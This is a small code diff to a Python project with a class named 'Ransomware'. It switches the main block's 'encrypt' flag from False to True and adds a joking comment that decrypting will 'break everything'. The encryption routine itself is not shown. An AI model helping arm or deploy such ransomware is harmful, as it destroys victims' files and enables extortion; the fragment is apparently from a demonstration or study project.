@@ -52,7 +52,8 @@ class Ransomware:
 if __name__ == "__main__":
 	
 	# Change this if you want to decrypt. Don't decrypt if you haven't encrypted. 
-	encrypt = False
+	# If you do, it will break everything. :) 
+	encrypt = True
 
 	ransomware = Ransomware()
 	if not path.exists("infection/ransom.key") and encrypt:
